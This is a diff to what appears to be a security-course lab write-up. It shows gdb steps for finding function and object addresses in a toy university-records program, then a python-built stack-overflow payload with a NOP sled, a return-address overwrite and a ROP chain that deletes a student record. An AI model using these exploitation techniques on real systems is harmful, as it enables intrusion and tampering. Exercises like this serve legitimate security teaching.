@@ -97,19 +97,43 @@ the guard 's value is modified or not.
 - > x10x 0xffffabcd
 
 ### Step4: Weponize the results to exmatriculate Klaus once again
+- exmatriculate address: 
+    - > p University::exmatriculate(unsigned int)  
+    - $1 = {void (University * const, const unsigned int)} 0x804b202 <University::exmatriculate(unsigned int)>
+- exit address: 
+    > p exit 
+    - $2 = {void (int)} 0xf7b51460 <__GI_exit>
+- btu object address:
+    > p &btu
+    - $3 = (University *) 0x8050e40 <btu>
+- Klaus Id numeric value in little indean hex value: 
+    - b"\xff\x1c\x45\x6a"
 
-
-# Martin code: 
+- last_name ROP chain is: 
+    - just after defining the Student pointer
+    ```cpp
+        // allocate a new Student record
+        Student* record = new Student;
+        record->name = new char[strlen(name)];
+        record->last_name = new char[strlen(last_name)];
+    ```
+    - we can excute these commands to get the address: 
+        - > p record
+        - > p *record
+        - we should see this result: 
+            - ![alt text](image-61.png)
+        - the address of lastname now is: 
+            - 0x08055d00
 
 ```bash
-gdb --args ./build/bin/btu add Martin "$(python3 -c 'import sys; sys.stdout.buffer.write(
-    b"\x66\xb1\x04\x08" +  # exmatriculate() address
-    b"\xb0\x25\xb1\xf7" +  # exit() address
-    b"\x60\x0c\x05\x08" +  # this pointer (btu)
-    b"\xff\x1c\x45\x6a"    # student ID (Klaus)
-)')" 222 "$(python3 -c 'import sys; sys.stdout.buffer.write(
-    b"\x90"*32 +           # NOP sled to fill password buffer (32 bytes)
-    b"DDDD" +              # filler for next 4 bytes after buffer
-    b"\x6c\xcb\xff\xff"    # return address overwrite (points to last_name ROP chain)
+    gdb --args ./build/bin/btu add Abdelaziz "$(python3 -c 'import sys; sys.stdout.buffer.write(
+        b"\x02\xb2\x04\x08" +  # exmatriculate() address
+        b"\x60\x14\xb5\xf7" +  # exit() address
+        b"\x40\x0e\x05\x08" +  # this pointer (btu)
+        b"\xff\x1c\x45\x6a"    # student ID (Klaus)
+    )')" 222 "$(python3 -c 'import sys; sys.stdout.buffer.write(
+        b"\x90"*32 +           # NOP sled to fill password buffer (32 bytes)
+        b"DDDD" +              # filler for next 4 bytes after buffer (ID)
+        b"\x00\x5d\x05\x08"    # return address overwrite (points to last_name ROP chain)
     )')"
 ```
